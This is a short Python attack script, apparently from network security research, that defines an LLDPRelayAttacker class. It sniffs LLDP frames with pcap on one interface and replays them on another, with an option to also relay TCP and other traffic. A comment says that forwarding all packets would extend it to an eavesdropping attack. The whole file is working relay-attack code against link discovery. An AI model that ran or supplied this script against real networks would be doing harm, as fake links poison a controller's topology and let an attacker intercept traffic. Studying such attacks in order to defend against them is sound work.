import time
import pcap
import dpkt
import random
from optparse import OptionParser

class LLDPRelayAttacker(object):
    '''
    bind_iface: the binding interface to sniff LLDP packets.
    relay_ends: relay the LLDP to the ends through UDP sockets. 
    '''
    def __init__(self, in_dev, out_dev, fwd_all):
        self._init_pcap(in_dev, out_dev, fwd_all)

    def _init_pcap(self, in_dev, out_dev, fwd_all):
        self.in_handler = pcap.pcap(in_dev, promisc=False, immediate=True, timeout_ms=5)
        self.in_handler.setdirection(pcap.PCAP_D_IN)
        if not int(fwd_all):
            filter_strategy = 'ether proto 0x88cc'
        else:
            filter_strategy = 'tcp or (ether proto 0x88cc) or \
                (not ether dst host ff:ff:ff:ff:ff:ff and \
                 not ether src host 00:00:de:ad:be:ef)'
        self.in_handler.setfilter(filter_strategy)
        self.out_handler = pcap.pcap(out_dev)

    # Since we only focus on LLDP packets, thus ignore other packets here.
    # In reality, to further raise eavesdropping attack, all the packets should 
    # be forwarded (relayed). However, the function can be realized in other modules.    
    def _loop_capture(self, pcap_handler):
        for _, pdata in pcap_handler:
            self.out_handler.sendpacket(pdata)

    def run(self):
        try:
            self._loop_capture(self.in_handler)
        except KeyboardInterrupt:
            return 

        
if __name__ == '__main__':
    prompt = '''usage: %prog  -i in_dev ip -o out_dev'''
    parser = OptionParser(usage=prompt)
    parser.add_option('-i', '--in', dest='in_dev')
    parser.add_option('-o', '--out', dest='out_dev')
    parser.add_option('-a', '--all', dest='fwd_all', type="int", default=False)
    (options, args) = parser.parse_args()

    relay_attacker = LLDPRelayAttacker(options.in_dev, options.out_dev, options.fwd_all)
    relay_attacker.run()